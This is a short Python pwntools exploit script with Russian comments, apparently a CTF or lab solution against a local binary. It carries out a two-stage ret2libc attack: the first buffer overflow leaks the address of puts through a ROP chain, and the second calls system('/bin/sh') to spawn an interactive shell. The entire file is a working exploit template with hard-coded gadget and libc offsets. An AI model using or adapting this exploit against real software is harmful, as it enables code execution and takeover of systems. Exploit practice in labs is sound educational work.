from pwn import *

# адреса pop_rdi и puts@, берутся из info function для первого BOF
pop_rdi = 0x40114a
puts_got = 0x404000
puts_plt = 0x401030

# берется из info function для второго BOF
main = 0x401170
ret = 0x4011d8

p = process('../app/main')
#pause()
p.recvline()
p.sendline(b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

#puts_addr = p.recv(6)
puts_addr = int(p.recvline()[:-1][::-1].hex(), 16)

# из puts вычитаем сдвиг до начального адреса libc
libc_addr = puts_addr - 0x7f760

# к начальному адресу libc прибавляем сдвиг до функции system
system_addr = libc_addr + 0x528f0

print(f'puts_addr: {hex(puts_addr)}')
print(f'libc_addr: {hex(libc_addr)}')
print(f'system_addr: {hex(system_addr)}')

binsh = libc_addr + 0x1a7e43

# второе переполнение BOF

p.sendline(b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_addr))

p.interactive()
